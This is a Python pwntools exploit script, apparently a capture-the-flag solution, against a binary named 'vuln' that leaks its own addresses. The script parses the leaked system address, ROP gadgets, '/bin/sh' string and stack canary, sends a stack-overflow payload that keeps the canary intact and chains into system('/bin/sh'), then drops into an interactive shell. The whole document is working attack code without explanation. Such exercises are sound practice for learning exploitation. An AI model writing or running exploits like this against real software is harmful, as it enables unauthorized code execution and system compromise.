#!/usr/bin/env python3
from pwn import *
from hakai import *

exe = ELF('vuln', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b* main+283
        b* main+409
        c
        ''')
        input()

if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])
# GDB()
ru(p, b'system @ ')
system = int(p.recvline()[:-1], 16)
p.recvuntil(b'ret @ ')
pop_rdi_ret = int(p.recvline()[:-1], 16)
ru(p, b'ret @ ')
ret = int(rl(p)[:-1], 16)
ru(p, b'sh" @ ')
binsh = int(p.recvline()[:-1], 16)
ru(p, b'canary: ')
canary = int(p.recvline()[:-1], 16)
info('System: ' + hex(system))
info('Pop_rdi: ' + hex(pop_rdi_ret))
info('Ret: ' + hex(ret))
info('binsh: ' + hex(binsh))
info('canary: ' + hex(canary))
payload = p64(0xdeadbeef)*7 + p64(canary) + p64(0) + p64(pop_rdi_ret) + p64(binsh) + p64(ret) + p64(system)
sla(p, b'ed!): ', payload)
p.interactive()
